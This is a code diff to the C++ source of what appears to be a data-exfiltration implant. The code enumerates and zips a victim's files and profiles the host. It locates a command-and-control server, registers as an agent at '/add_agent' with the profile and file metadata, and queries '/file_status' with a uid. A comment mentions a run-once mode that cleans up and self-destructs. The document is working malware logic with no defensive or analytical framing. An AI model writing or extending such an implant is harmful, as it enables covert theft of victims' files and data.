@@ -9,6 +9,10 @@
 #include "Communication/senddata.hpp"
 
 
+std::string zipDestStr;
+std::wstring C2;
+
+
 std::map<std::string, std::map<std::string, std::string>> FileEnum() {
     std::vector<std::wstring> DIR_PATHS;
     std::map<std::string, std::map<std::string, std::string>> FILE_PATHS;
@@ -49,7 +53,7 @@ void GenZip() {
 
     // Zip the files
     std::wstring zipDest = std::wstring(tmpDir.begin(), tmpDir.end()) + L"zipped.zip";
-    std::string zipDestStr = WStringToString(zipDest);
+    zipDestStr = WStringToString(zipDest);
     int zipResult = ZipFiles(zipDest, filesToZip);
     if (zipResult != ZIP_SUCCESS) {
         std::cerr << "There was an error zipping the files." << std::endl;
@@ -61,35 +65,44 @@ void GenZip() {
     for (auto& [key, value] : metadata.items()) {
         std::cout << key << ": " << value << std::endl;
     }
-
-    // Send zip to server
 }
 
 
 int main() {
 
+    std::wstring uid;
+
     // Mode 1: run once and then > cleanup > self destruct
     if (ONETIMERUN) {  
+        GenZip(); 
         bool ReachIntranet = googleConn(); 
         if (ReachIntranet) { 
-            std::wstring C2 = C2Conn(URLS); 
+            C2 = C2Conn(URLS); 
             if (!C2.empty()) {
                 // Path to /add_agent
                 std::wstring PC2 = C2 + STAGE1PATH;
                 nlohmann::json JsonProfile = Profiler(); 
+                uid = GetUIDFromFile(); // once profiler is called, uid file is created
+
+                nlohmann::json metadata = GenFileMetadata(zipDestStr, CHUNK_SIZE); 
+                JsonProfile["file_metadata"] = metadata;
+
                 std::string response = SendData(L"POST", PC2, L"", JsonProfile, L"");
                 auto jsonResp = nlohmann::json::parse(response);
                 if (jsonResp.contains("message") && jsonResp["message"] == "created") {
-                    GenZip();
+                    std::cout << "JSON response: " << jsonResp << std::endl;
                 }
-                
             }
-            
         }
-        
+        // Check file status
+        std::wstring FileStatusURL = C2 + L"/file_status";
+        nlohmann::json UidJson = {{"uid", WStringToString(uid)}};
+        std::string response = SendData(L"POST", FileStatusURL, L"", UidJson, L"");
+        auto jsonResp = nlohmann::json::parse(response);
+        std::cout << "JSON response: " << jsonResp << std::endl;
     }
-    
 
     return 0;
 }
+
 
